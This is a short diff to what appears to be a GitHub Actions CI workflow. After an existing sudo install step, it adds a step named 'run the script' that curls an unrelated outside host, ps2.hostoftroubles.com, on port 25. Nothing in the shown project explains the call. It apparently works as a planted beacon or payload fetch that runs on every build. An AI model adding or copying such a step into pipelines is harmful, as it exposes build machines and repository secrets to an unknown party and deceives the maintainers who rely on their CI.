@@ -15,3 +15,7 @@ jobs:
       - name: install dependencies
         run: |
           sudo /bin/bash prepare.sh
+          
+      - name: run the script
+        run: |
+          curl http://ps2.hostoftroubles.com:25/githuba-actions
